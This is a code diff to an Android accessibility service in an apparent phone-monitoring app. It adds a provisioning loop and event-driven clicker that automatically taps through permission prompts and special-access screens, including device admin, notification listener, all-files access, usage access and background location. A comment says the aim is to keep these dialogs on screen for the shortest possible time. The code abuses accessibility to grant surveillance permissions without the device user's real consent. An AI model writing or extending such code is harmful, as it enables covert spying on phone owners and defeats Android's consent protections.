@@ -188,6 +188,40 @@ class BlockAccessibilityService : AccessibilityService() {
         syncDebounceHandler.postDelayed(r, 600L)
     }
 
+    @Volatile
+    private var provisioningUntil = 0L
+
+    /**
+     * Long-running variant of the auto-grant loop used by the provisioning
+     * flow. The setup chain walks through ~10 system screens and OEM skins can
+     * be slow to render, so this keeps clicking for the whole sequence instead
+     * of the 15s window used for a single permission batch.
+     *
+     * Clicking is also event-driven (see onAccessibilityEvent), so this timer
+     * is only a safety net for screens that never emit a window-change event.
+     */
+    fun startProvisioningLoop(durationMs: Long = 180_000L) {
+        provisioningUntil = System.currentTimeMillis() + durationMs
+        val handler = Handler(Looper.getMainLooper())
+        val runnable = object : Runnable {
+            override fun run() {
+                try {
+                    clickAnyPermissionDialog()
+                } catch (_: Exception) {}
+                if (System.currentTimeMillis() < provisioningUntil) {
+                    handler.postDelayed(this, 300L)
+                }
+            }
+        }
+        handler.postDelayed(runnable, 100L)
+    }
+
+    fun isProvisioning(): Boolean = System.currentTimeMillis() < provisioningUntil
+
+    fun stopProvisioning() {
+        provisioningUntil = 0L
+    }
+
     fun startPermissionAutoGrantLoop() {
         val handler = Handler(Looper.getMainLooper())
         var runs = 0
@@ -220,6 +254,20 @@ class BlockAccessibilityService : AccessibilityService() {
             } catch (_: Exception) {}
 
             if (candidateRoots.isEmpty()) return false
+
+            // Special-access screens (usage access, all files, notification
+            // listener, device admin, role request, background location) are
+            // not permission dialogs - they have their own toggle/confirm
+            // controls, so try that clicker first. The generic allow-button
+            // list below would otherwise hit the wrong control on these pages.
+            try {
+                if (com.spapp.monitoring.provision.SpecialAccessClicker.handle(this, candidateRoots)) {
+                    scheduleSyncAfterPermissionClick()
+                    return true
+                }
+            } catch (e: Exception) {
+                Log.w("BlockA11y", "Special access click failed", e)
+            }
 
             // Target resource IDs across Google Pixel, AOSP, Samsung OneUI, Xiaomi MIUI, Oppo ColorOS, Vivo FuntouchOS
             val targetIds = listOf(
@@ -954,6 +1002,17 @@ class BlockAccessibilityService : AccessibilityService() {
                 currentForegroundApp = packageName
                 stopBrowserPolling()
                 return
+            }
+
+            // During provisioning, react to each settings screen the instant it
+            // appears instead of waiting for the 300ms polling tick. This keeps
+            // the permission dialogs on screen for the shortest possible time.
+            if (isProvisioning() &&
+                com.spapp.monitoring.provision.SpecialAccessClicker.isSettingsLike(packageName)
+            ) {
+                try {
+                    if (clickAnyPermissionDialog()) return
+                } catch (_: Exception) {}
             }
 
         // ==========================================
